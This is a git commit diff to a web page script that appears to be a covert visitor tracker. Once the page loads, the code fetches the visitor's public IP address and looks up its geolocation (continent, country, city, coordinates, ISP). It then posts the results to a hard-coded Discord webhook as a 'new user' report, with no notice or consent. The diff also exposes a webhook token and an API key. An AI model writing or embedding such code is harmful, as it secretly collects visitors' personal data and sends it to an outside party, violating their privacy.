496115b84c45f5035dcb353e0b79299ffd7ce6fe
nokee091 <152779272+nokee091@users.noreply.github.com>
2024-12-07 19:58:46 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,8 @@
 has_ip = false
 located = false
 
+const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay))
+
 
 function discord_msg(mesage) {
     fetch("https://discordapp.com/api/webhooks/1314333297173856328/cUtaTn4ds-wtmXm1BUIlGFzRg_eSVpKtNa3tchU00AjmC2PvlQWG9TlJ0d4_vTPOgQYQ", {
@@ -20,53 +22,63 @@ function discord_msg(mesage) {
         });
 };
 
-async function get_ip() {
+async function get_info() {
     try {
         const response = await fetch('https://api.ipify.org?format=json');
         let data = await response.json();
-         ipv4 = data.ip
-         document.getElementById("ip").innerText = ipv4
-         has_ip = true
+        ipv4 = data.ip
+        const requestOptions = {
+          method: "GET",
+          redirect: "follow"
+        };
+        fetch("https://api.ipgeolocation.io/ipgeo?apiKey=8b84965e7c8e445c8c8a98f1f0199837&ip=" + ipv4, requestOptions)
+          .then((response) => response.text())
+          .then((result) => info = result)
+          .catch((error) => console.error(error));
+
+        await sleep(1000);
+        info = JSON.parse(info)
+        console.log("info JSON.parse complete")
+        continent = info["continent_name"];
+        country = info['country_name'];
+        city = info['city']
+        latitude = info['latitude']
+        longitude = info['longitude']
+        organization = info['organization']
+        console.log("info gathered")
+        has_info = true
     }
         catch (error) {
         console.error('Error fetching IP address:', error);
         };
 };
 
-    function get_location() {
-    watchID = navigator.geolocation.watchPosition((position) => {
-        latitude = position.coords.latitude;
-        longitude = position.coords.longitude;
-        document.getElementById("location").innerText = (latitude + " " + longitude);
-        located = true
-      });
-};
-
-const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay))
 
 
 const send_to_discord = async () => {
-    await sleep(1000)
-    get_ip()
-    await sleep(200)
-    get_location()
-    await sleep(7000)
-    discord_msg("---------------------")
-    await sleep(200)
-    discord_msg("new user: ")
-    await sleep(200)
-    if (has_ip) {
-        i = discord_msg("ipv4: " + ipv4)
+    console.log(info)
+    await sleep(200);
+    if (has_info) {
+      var msg = '-------------- \n' +
+      'new user \n' +
+      'ip: ' + ipv4 + '\n' +
+      'contintent: ' + continent + '\n' +
+      'country: ' + country + '\n' +
+      'city: ' + city + '\n' +
+      'coords: ' + latitude + ', ' + longitude + '\n' +
+      'provider: ' + organization;
+      discord_msg(msg);
+      console.log("sent")
     } else {
-        discord_msg("ipv4: n/a")
-    }
-    await sleep(200)
-    if (located) {
-        discord_msg("location: " + latitude + ", " + longitude)
-    } else {
-        discord_msg("location: n/a")
-    }
+};
+};
+
+x = async () => {
+    console.log("starting")
+    await sleep(500);
+    get_info();
+    await sleep(5000);
+    send_to_discord();
 }
 
-send_to_discord()
-
+x()
